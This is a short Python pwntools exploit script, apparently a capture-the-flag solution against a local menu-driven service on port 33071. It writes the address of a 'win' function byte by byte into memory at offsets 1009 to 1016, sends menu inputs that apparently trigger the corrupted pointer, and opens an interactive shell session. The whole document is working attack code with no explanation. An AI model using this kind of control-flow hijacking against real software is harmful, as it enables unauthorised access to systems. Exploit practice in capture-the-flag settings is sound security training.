from pwn import *

# SPLOIT #

r = remote("127.0.0.1", 33071)

win_addr = p64(0x401895)[::-1]

for i in range(8):
    r.sendline("1")
    r.sendline(str(1009 + i))
    r.sendline(str(ord(win_addr[i])))

r.sendline("3")
r.sendline("1024")
r.sendline("5")
r.sendline("1")
r.sendline("5")
r.sendline("0.00048828125")
r.sendline("4")
r.sendline("6")

r.interactive()
